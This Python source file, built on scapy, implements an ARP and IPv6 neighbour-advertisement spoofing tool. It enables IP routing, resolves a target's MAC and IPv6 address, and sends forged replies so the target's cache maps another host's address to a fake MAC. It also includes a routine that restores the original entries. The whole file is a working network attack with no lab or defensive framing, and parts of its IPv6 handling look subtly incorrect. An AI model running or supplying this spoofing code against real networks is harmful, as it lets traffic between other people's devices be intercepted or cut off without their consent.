from scapy.all import ARP, Ether, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, send, srp, srp1, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr


def enableIPRoute(os):
    print("OS detected: ", os)
    if os == "Windows":
        from windows_ip_router import IP_Router
        router = IP_Router()
        router.start()
        print("IP routing enabled.")
    elif os == "Linux":
        from linux_ip_router import enable_linux_iproute
        enable_linux_iproute()
        print("IP routing enabled.")
    else:
        print("This code does not support the given OS :(")
        exit()


def getMac(ip, interface=None):
    # Initiates an ARP resolution between your machine and the target machine.
    # Tells the wifi router to ask "Who has <ip>? Respond with your MAC address."
    # Your IP is sent in this request by default so that the response is directly sent to your machine.
    arp_frame = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    if interface:
        ans, _ = srp(arp_frame, iface=interface, timeout=3, verbose=0)
    else:
         ans, _ = srp(arp_frame, timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    

def getIPv6(IPv4, interface=None):
    # Gets a device's IPv6 address given its IPv4 address
    # Basically converts IPv4 to IPv6 (in this context only)
    mac = ""
    if interface:
        mac = getMac(IPv4, interface)
    else:
        mac = getMac(IPv4)
    ns = IPv6(dst="ff02::1:ff" + mac[-6:].replace(":", ""))/ICMPv6ND_NS(tgt="ff02::1:ff" + mac[-6:].replace(":", ""))/ICMPv6NDOptSrcLLAddr(lladdr=mac)
    if interface:
        ans = srp1(ns, iface=interface, timeout=3, verbose=0)
    else:
        ans = srp1(ns, timeout=3, verbose=0)
    if ans and ans.haslayer(ICMPv6NDOptDstLLAddr):
        print("IPv6 address found: ", ans[IPv6].src)
        return ans[IPv6].src
    return None
    

class Spoofer:

    def __init__(self, con_mode):
        self.connection_mode = con_mode
        self.interface = ""
        if self.connection_mode == "wifi":
            self.interface = input("Please enter your wifi interface: ")
        elif self.connection_mode == "eth":
            pass


    def spoof(self, target_ip, spoofed_ip):
        
        target_mac = ""
        target_ipv6 = ""
        spoofed_ipv6 = ""
        if self.connection_mode == "wifi":
            target_mac = getMac(target_ip, self.interface)
            target_ipv6 = getIPv6(target_ip, self.interface)
            spoofed_ipv6 = getIPv6(spoofed_ip, self.interface)
        elif self.connection_mode == "eth":
            target_mac = getMac(target_ip)
            target_ipv6 = getIPv6(target_ip)
            spoofed_ipv6 = getIPv6(spoofed_ip)

        spoofed_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=spoofed_ip, hwsrc="00:00:00:00:00:00", op=2)
        spoofed_arp_ipv6 = (IPv6(dst=target_ipv6, src=spoofed_ipv6)/ICMPv6ND_NA(tgt=spoofed_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
        
        send(spoofed_arp_ipv4, verbose=1)
        print("Spoofed ARP sent to IPv4", target_ip, "with MAC", target_mac)
        send(spoofed_arp_ipv6, verbose=1)
        print("Spoofed ARP sent to IPv6", target_ip, "with MAC", target_mac)


    def unspoof(self, target_ip, real_ip):
        target_mac = getMac(target_ip)
        real_mac = getMac(real_ip)
        target_ipv6 = getIPv6(target_ip)
        real_ipv6 = getIPv6(real_ip)
        unspoofing_arp_ipv4 = ARP(pdst=target_ip, hwdst=target_mac, psrc=real_ip, hwsrc=real_mac, op=2)
        unspoofing_arp_ipv6 = (IPv6(dst=target_ipv6, src=real_ipv6)/ICMPv6ND_NA(tgt=real_ipv6, R=1, S=1, O=1)/ICMPv6NDOptDstLLAddr(lladdr="00:00:00:00:00:00"))
        send(unspoofing_arp_ipv4, verbose=1, count=7)
        send(unspoofing_arp_ipv6, verbose=1, count=7)
        print("Original ARPs restrored.")

